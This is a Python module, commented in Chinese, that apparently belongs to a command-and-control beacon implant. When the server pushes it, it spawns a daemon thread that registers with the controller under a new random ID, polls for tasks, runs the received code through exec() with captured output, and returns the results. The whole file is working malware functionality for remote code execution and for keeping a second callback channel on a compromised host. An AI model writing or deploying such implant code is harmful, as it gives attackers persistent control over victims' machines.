"""fork — 分裂出独立回连的 beacon 线程（break 单独退出）。

执行后开一个 daemon 线程，用【新 ID】独立注册回连（server 视为新
beacon：独立队列、独立结果）。分裂线程与主进程互不影响：
  - break 任务设置 _FORK_BREAK=True → 分裂线程循环退出（线程结束）
  - 主 beacon 循环检查 _B，不检查 _FORK_BREAK → 主进程不受影响

分裂线程运行期间置 _IN_FORK=True（break 命令据此判定退出层），
线程结束时恢复。分裂线程执行任务用独立 _fork_exec（自带 stdout/
stderr 捕获），避免与主线程共用 r() 的重定向竞态。

依赖 beacon 全局（D2 短名契约）: _T/g/p/q/s/f/l/i/j/_FORK_BREAK/_IN_FORK
"""

import threading as _th

MODULE = {
    "desc": "分裂出独立回连的 beacon 线程（break 单独退出）",
    "params": [],
}


def run():
    """启动分裂线程并立即返回（主 beacon 继续正常轮询）。"""
    G = globals()
    G["_FORK_BREAK"] = False
    cid = l.token_hex(8)
    _th.Thread(target=_fork_cycle, args=(cid,), daemon=True).start()
    return f"(fork 已启动: {cid}，独立回连中)"


def _fork_cycle(cid):
    """分裂线程主循环：独立注册/取任务/回传，检查 _FORK_BREAK。"""
    G = globals()
    G["_IN_FORK"] = True
    try:
        while not G["_FORK_BREAK"]:
            try:
                t = _T()
                p(t, g.dumps({"type": "register", "version": 1,
                              "role": "beacon", "id": cid,
                              "fork": True}).encode())
                while not G["_FORK_BREAK"]:
                    u = g.loads(q(t).decode())
                    v = u.get("type")
                    if v == "welcome":
                        continue
                    if v in ("task", "init_task"):
                        w, x = _fork_exec(u["code"])
                        p(t, g.dumps({"type": "result",
                                      "task_id": u.get("task_id", ""),
                                      "output": w, "error": x}).encode())
                    elif v == "pong":
                        break
                    elif v == "error":
                        break
                t.close()
            except Exception:
                pass
            if not G["_FORK_BREAK"]:
                f.sleep(s())
    finally:
        G["_IN_FORK"] = False


def _fork_exec(code):
    """分裂线程独立执行任务代码（独立 stdout/stderr 捕获）。

    M1：与主线程 r() 共享进程级 sys.stdout——并发重定向会串扰，
    用 beacon 全局 _L 互斥（模板 r() 同一把锁）。
    """
    import io as _io
    G = globals()
    lock = G.get("_L")
    if lock is not None:
        with lock:
            return _fork_exec_locked(code, _io)
    return _fork_exec_locked(code, _io)


def _fork_exec_locked(code, _io):
    o, e = _io.StringIO(), _io.StringIO()
    _old_out, _old_err = i.stdout, i.stderr
    i.stdout, i.stderr = o, e
    try:
        exec(code, globals())
        return o.getvalue(), e.getvalue()
    except Exception:
        return o.getvalue(), e.getvalue() + j.format_exc()
    finally:
        i.stdout, i.stderr = _old_out, _old_err


if __name__ == "__main__":
    print("fork: 由 server 下发执行，不直接运行")
